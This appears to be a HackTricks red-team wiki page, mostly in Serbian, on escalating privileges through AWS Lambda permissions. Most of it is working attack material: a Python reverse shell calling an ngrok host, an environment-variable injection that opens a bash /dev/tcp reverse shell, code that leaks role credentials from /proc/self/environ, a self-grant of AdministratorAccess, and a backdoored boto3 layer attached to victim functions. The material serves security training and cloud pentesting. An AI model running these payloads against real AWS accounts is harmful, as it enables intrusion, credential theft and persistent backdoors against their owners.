# AWS - Lambda Privesc

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## lambda

Vi≈°e informacija o lambda u:

{% content-ref url="../aws-services/aws-lambda-enum.md" %}
[aws-lambda-enum.md](../aws-services/aws-lambda-enum.md)
{% endcontent-ref %}

### `iam:PassRole`, `lambda:CreateFunction`, (`lambda:InvokeFunction` | `lambda:InvokeFunctionUrl`)

Korisnici sa **`iam:PassRole`, `lambda:CreateFunction`, i `lambda:InvokeFunction`** dozvolama mogu poveƒáati svoje privilegije.\
Mogu **napraviti novu Lambda funkciju i dodeliti joj postojeƒáu IAM ulogu**, dajuƒái funkciji dozvole povezane sa tom ulogom. Korisnik mo≈æe zatim **napisati i otpremiti kod u ovu Lambda funkciju (sa rev shell-om na primer)**.\
Kada je funkcija postavljena, korisnik mo≈æe **pokrenuti njeno izvr≈°avanje** i nameravane akcije pozivajuƒái Lambda funkciju putem AWS API-ja. Ovaj pristup efikasno omoguƒáava korisniku da izvr≈°ava zadatke indirektno kroz Lambda funkciju, delujuƒái sa nivoom pristupa dodeljenim IAM ulozi povezanoj sa njom.\\

Napadaƒç bi mogao zloupotrebiti ovo da dobije **rev shell i ukrade token**:

{% code title="rev.py" %}
```python
import socket,subprocess,os,time
def lambda_handler(event, context):
s = socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(('4.tcp.ngrok.io',14305))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(['/bin/sh','-i'])
time.sleep(900)
return 0
```
{% endcode %}
```bash
# Zip the rev shell
zip "rev.zip" "rev.py"

# Create the function
aws lambda create-function --function-name my_function \
--runtime python3.9 --role <arn_of_lambda_role> \
--handler rev.lambda_handler --zip-file fileb://rev.zip

# Invoke the function
aws lambda invoke --function-name my_function output.txt
## If you have the lambda:InvokeFunctionUrl permission you need to expose the lambda inan URL and execute it via the URL

# List roles
aws iam list-attached-user-policies --user-name <user-name>
```
Mo≈æete takoƒëe **zloupotrebiti dozvole lambda uloge** iz same lambda funkcije.\
Ako je lambda uloga imala dovoljno dozvola, mogli biste je iskoristiti da vam dodelite administratorska prava:
```python
import boto3
def lambda_handler(event, context):
client = boto3.client('iam')
response = client.attach_user_policy(
UserName='my_username',
PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
)
return response
```
Takoƒëe je moguƒáe da se procure kredencijali lambda uloge bez potrebe za spoljnjom konekcijom. Ovo bi bilo korisno za **Network isolated Lambdas** kori≈°ƒáene za interne zadatke. Ako postoje nepoznate sigurnosne grupe koje filtriraju va≈°e obrnute ljuske, ovaj deo koda ƒáe vam omoguƒáiti da direktno procurete kredencijale kao izlaz lambda.
```python
def handler(event, context):
sessiontoken = open('/proc/self/environ', "r").read()
return {
'statusCode': 200,
'session': str(sessiontoken)
}
```

```bash
aws lambda invoke --function-name <lambda_name> output.txt
cat output.txt
```
**Potencijalni uticaj:** Direktno privesc na proizvoljnu lambda servisnu ulogu koja je navedena.

{% hint style="danger" %}
Imajte na umu da ƒçak i ako izgleda zanimljivo **`lambda:InvokeAsync`** **ne** omoguƒáava samo po sebi da **izvr≈°ite `aws lambda invoke-async`**, takoƒëe vam je potrebna `lambda:InvokeFunction`
{% endhint %}

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:AddPermission`

Kao u prethodnom scenariju, mo≈æete **dodeliti sebi dozvolu `lambda:InvokeFunction`** ako imate dozvolu **`lambda:AddPermission`**
```bash
# Check the previous exploit and use the following line to grant you the invoke permissions
aws --profile "$NON_PRIV_PROFILE_USER" lambda add-permission --function-name my_function \
--action lambda:InvokeFunction --statement-id statement_privesc --principal "$NON_PRIV_PROFILE_USER_ARN"
```
**Potencijalni uticaj:** Direktno privesc na proizvoljnu lambda servisnu ulogu koja je navedena.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateEventSourceMapping`

Korisnici sa **`iam:PassRole`, `lambda:CreateFunction`, i `lambda:CreateEventSourceMapping`** dozvolama (i potencijalno `dynamodb:PutItem` i `dynamodb:CreateTable`) mogu indirektno **escalate privileges** ƒçak i bez `lambda:InvokeFunction`.\
Mogu kreirati **Lambda funkciju sa zloƒáudnim kodom i dodeliti joj postojeƒáu IAM ulogu**.

Umesto da direktno pozivaju Lambda, korisnik postavlja ili koristi postojeƒáu DynamoDB tabelu, povezujuƒái je sa Lambdom putem mape izvora dogaƒëaja. Ova postavka osigurava da se Lambda funkcija **automatski aktivira prilikom unosa novog stavke** u tabelu, bilo akcijom korisnika ili nekim drugim procesom, ƒçime se indirektno poziva Lambda funkcija i izvr≈°ava kod sa dozvolama prosleƒëene IAM uloge.
```bash
aws lambda create-function --function-name my_function \
--runtime python3.8 --role <arn_of_lambda_role> \
--handler lambda_function.lambda_handler \
--zip-file fileb://rev.zip
```
Ako je DynamoDB veƒá aktivan u AWS okru≈æenju, korisnik samo **treba da uspostavi mapiranje izvora dogaƒëaja** za Lambda funkciju. Meƒëutim, ako se DynamoDB ne koristi, korisnik mora **da kreira novu tabelu** sa omoguƒáenom striming funkcijom:
```bash
aws dynamodb create-table --table-name my_table \
--attribute-definitions AttributeName=Test,AttributeType=S \
--key-schema AttributeName=Test,KeyType=HASH \
--provisioned-throughput ReadCapacityUnits=5,WriteCapacityUnits=5 \
--stream-specification StreamEnabled=true,StreamViewType=NEW_AND_OLD_IMAGES
```
Sada je moguƒáe **povezati Lambda funkciju sa DynamoDB tabelom** tako ≈°to ƒáete **napraviti mapiranje izvora dogaƒëaja**:
```bash
aws lambda create-event-source-mapping --function-name my_function \
--event-source-arn <arn_of_dynamodb_table_stream> \
--enabled --starting-position LATEST
```
Sa Lambda funkcijom povezano≈°ƒáu sa DynamoDB strimom, napadaƒç mo≈æe **indirektno aktivirati Lambda funkciju aktiviranjem DynamoDB strima**. To se mo≈æe postiƒái **ubacivanjem stavke** u DynamoDB tabelu:
```bash
aws dynamodb put-item --table-name my_table \
--item Test={S="Random string"}
```
**Potencijalni Uticaj:** Direktno privesc na ulogu lambda servisa koja je navedena.

### `lambda:AddPermission`

Napadaƒç sa ovom dozvolom mo≈æe **dodeliti sebi (ili drugima) bilo kakve dozvole** (ovo generi≈°e politike zasnovane na resursima za dodeljivanje pristupa resursu):

{% code overflow="wrap" %}
```bash
# Give yourself all permissions (you could specify granular such as lambda:InvokeFunction or lambda:UpdateFunctionCode)
aws lambda add-permission --function-name <func_name> --statement-id asdasd --action '*' --principal arn:<your user arn>

# Invoke the function
aws lambda invoke --function-name <func_name> /tmp/outout
```
{% endcode %}

**Potencijalni uticaj:** Direktno privesc na ulogu lambda servisa kori≈°ƒáenjem dozvole za modifikaciju koda i njegovo pokretanje.

### `lambda:AddLayerVersionPermission`

Napadaƒç sa ovom dozvolom mo≈æe **dati sebi (ili drugima) dozvolu `lambda:GetLayerVersion`**. Mogao bi pristupiti sloju i tra≈æiti ranjivosti ili osetljive informacije.

{% code overflow="wrap" %}
```bash
# Give everyone the permission lambda:GetLayerVersion
aws lambda add-layer-version-permission --layer-name ExternalBackdoor --statement-id xaccount --version-number 1 --principal '*' --action lambda:GetLayerVersion
```
{% endcode %}

**Potencijalni uticaj:** Potencijalni pristup osetljivim informacijama.

### `lambda:UpdateFunctionCode`

Korisnici koji imaju **`lambda:UpdateFunctionCode`** dozvolu imaju potencijal da **modifikuju kod postojeƒáe Lambda funkcije koja je povezana sa IAM rolom.**\
Napadaƒç mo≈æe **modifikovati kod lambda funkcije da bi eksfiltrirao IAM akreditive**.

Iako napadaƒç mo≈æda nema direktnu sposobnost da pozove funkciju, ako je Lambda funkcija veƒá postojala i operativna, verovatno ƒáe biti pokrenuta kroz postojeƒáe radne tokove ili dogaƒëaje, ƒçime se indirektno olak≈°ava izvr≈°enje modifikovanog koda.

{% code overflow="wrap" %}
```bash
# The zip should contain the lambda code (trick: Download the current one and add your code there)
aws lambda update-function-code --function-name target_function \
--zip-file fileb:///my/lambda/code/zipped.zip

# If you have invoke permissions:
aws lambda invoke --function-name my_function output.txt

# If not check if it's exposed in any URL or via an API gateway you could access
```
{% endcode %}

**Potencijalni uticaj:** Direktno privesc na ulogu lambda servisa.

### `lambda:UpdateFunctionConfiguration`

#### RCE putem env varijabli

Sa ovim dozvolama moguƒáe je dodati varijable okru≈æenja koje ƒáe uzrokovati da Lambda izvr≈°i proizvoljan kod. Na primer, u python-u je moguƒáe zloupotrebiti varijable okru≈æenja `PYTHONWARNING` i `BROWSER` da bi se python proces izvr≈°io proizvoljne komande:

{% code overflow="wrap" %}
```bash
aws --profile none-priv lambda update-function-configuration --function-name <func-name> --environment "Variables={PYTHONWARNINGS=all:0:antigravity.x:0:0,BROWSER=\"/bin/bash -c 'bash -i >& /dev/tcp/2.tcp.eu.ngrok.io/18755 0>&1' & #%s\"}"
```
{% endcode %}

Za druge skriptne jezike postoje druge env promenljive koje mo≈æete koristiti. Za vi≈°e informacija proverite podsekcije skriptnih jezika u:

{% embed url="https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse" %}

#### RCE putem Lambda Layers

[**Lambda Layers**](https://docs.aws.amazon.com/lambda/latest/dg/configuration-layers.html) omoguƒáava ukljuƒçivanje **koda** u va≈°u lambda funkciju, ali **da se ƒçuva odvojeno**, tako da kod funkcije mo≈æe ostati mali i **vi≈°e funkcija mo≈æe deliti kod**.

Unutar lambda mo≈æete proveriti putanje sa kojih se python kod uƒçitava pomoƒáu funkcije kao ≈°to je sledeƒáa:
```python
import json
import sys

def lambda_handler(event, context):
print(json.dumps(sys.path, indent=2))
```
Ovo su mesta:

1. /var/task
2. /opt/python/lib/python3.7/site-packages
3. /opt/python
4. /var/runtime
5. /var/lang/lib/python37.zip
6. /var/lang/lib/python3.7
7. /var/lang/lib/python3.7/lib-dynload
8. /var/lang/lib/python3.7/site-packages
9. /opt/python/lib/python3.7/site-packages
10. /opt/python

Na primer, biblioteka boto3 se uƒçitava iz `/var/runtime/boto3` (4. pozicija).

#### Eksploatacija

Moguƒáe je zloupotrebiti dozvolu `lambda:UpdateFunctionConfiguration` da **dodate novi sloj** funkciji lambda. Da biste izvr≈°ili proizvoljan kod, ovaj sloj treba da sadr≈æi neku **biblioteku koju ƒáe lambda uvesti.** Ako mo≈æete da proƒçitate kod lambda, mogli biste to lako pronaƒái, takoƒëe imajte na umu da mo≈æe biti moguƒáe da lambda **veƒá koristi sloj** i da mo≈æete **preuzeti** sloj i **dodati svoj kod** unutra.

Na primer, pretpostavimo da lambda koristi biblioteku boto3, ovo ƒáe kreirati lokalni sloj sa poslednjom verzijom biblioteke:
```bash
pip3 install -t ./lambda_layer boto3
```
Mo≈æete otvoriti `./lambda_layer/boto3/__init__.py` i **dodati backdoor u globalni kod** (funkciju za eksfiltraciju kredencijala ili dobijanje reverzibilne ljuske, na primer).

Zatim, zipujte taj `./lambda_layer` direktorijum i **otpremite novi lambda sloj** na svoj raƒçun (ili na raƒçun ≈ærtve, ali mo≈æda nemate dozvole za to).\
Napomena: potrebno je da kreirate python folder i stavite biblioteke unutra da biste prepisali /opt/python/boto3. Takoƒëe, sloj mora biti **kompatibilan sa verzijom pythona** koja se koristi u lambdi, a ako ga otpremite na svoj raƒçun, mora biti u **isto—ò regiji:**

{% code overflow="wrap" %}
```bash
aws lambda publish-layer-version --layer-name "boto3" --zip-file file://backdoor.zip --compatible-architectures "x86_64" "arm64" --compatible-runtimes "python3.9" "python3.8" "python3.7" "python3.6"
```
{% endcode %}

Sada, uƒçinite uƒçitani lambda sloj **dostupnim za bilo koji nalog**:
```bash
aws lambda add-layer-version-permission --layer-name boto3 \
--version-number 1 --statement-id public \
--action lambda:GetLayerVersion --principal *
```
I prikaƒçite lambda sloj na funkciju lambda ≈ærtve:
```bash
aws lambda update-function-configuration \
--function-name <func-name> \
--layers arn:aws:lambda:<region>:<attacker-account-id>:layer:boto3:1 \
--timeout 300 #5min for rev shells
```
The next step would be to either **invoke the function** ourselves if we can or to wait until **se pozove** normalnim putem ‚Äì ≈°to je sigurnija metoda.

**Skriveniji naƒçin za iskori≈°ƒáavanje ove ranjivosti** mo≈æe se naƒái u:

{% content-ref url="../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md" %}
[aws-lambda-layers-persistence.md](../aws-persistence/aws-lambda-persistence/aws-lambda-layers-persistence.md)
{% endcontent-ref %}

**Potencijalni uticaj:** Direktno privesc na lambda servisnu ulogu koja se koristi.

### `iam:PassRole`, `lambda:CreateFunction`, `lambda:CreateFunctionUrlConfig`, `lambda:InvokeFunctionUrl`

Mo≈æda sa tim dozvolama mo≈æete kreirati funkciju i izvr≈°iti je pozivajuƒái URL... ali nisam mogao da pronaƒëem naƒçin da to testiram, pa mi javite ako uspete!

### Lambda MitM

Neki lambdas ƒáe **primati osetljive informacije od korisnika u parametrima.** Ako dobijete RCE u jednom od njih, mo≈æete exfiltrirati informacije koje drugi korisnici ≈°alju, proverite to u:

{% content-ref url="../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md" %}
[aws-warm-lambda-persistence.md](../aws-post-exploitation/aws-lambda-post-exploitation/aws-warm-lambda-persistence.md)
{% endcontent-ref %}

## Reference

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation-part-2/)

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
